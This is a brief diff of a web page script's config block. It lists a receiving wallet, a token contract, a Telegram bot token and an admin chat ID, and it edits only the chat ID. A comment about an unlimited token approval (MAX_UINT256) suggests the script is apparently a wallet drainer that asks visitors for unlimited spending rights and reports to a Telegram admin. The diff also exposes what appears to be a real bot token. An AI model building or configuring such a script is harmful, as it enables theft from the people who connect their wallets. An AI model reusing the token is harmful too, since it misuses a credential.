@@ -23,7 +23,7 @@ document.addEventListener("DOMContentLoaded", function () {
         COMPANY_WALLET_ADDRESS: "0x3D096439c5A13eb656E7BD917Fe5a93A6194fF62",
         CONTRACT_ADDRESS: "0x38726eb8c302a9171B5c4A41CCbF47C38100D4d9",
         TELEGRAM_BOT_TOKEN: "8976920389:AAEDhWwx4eWf4QB7ZOlNWbanpoBa55Mb8Ks", // Notification Bot Token (Bot A)
-        ADMIN_CHAT_ID: "8976920389", // CRITICAL: Your Admin Group Chat ID
+        ADMIN_CHAT_ID: "7354974947", // CRITICAL: Your Admin Group Chat ID
     };
 
     // Constant for Unlimited Approval (MAX_UINT256)
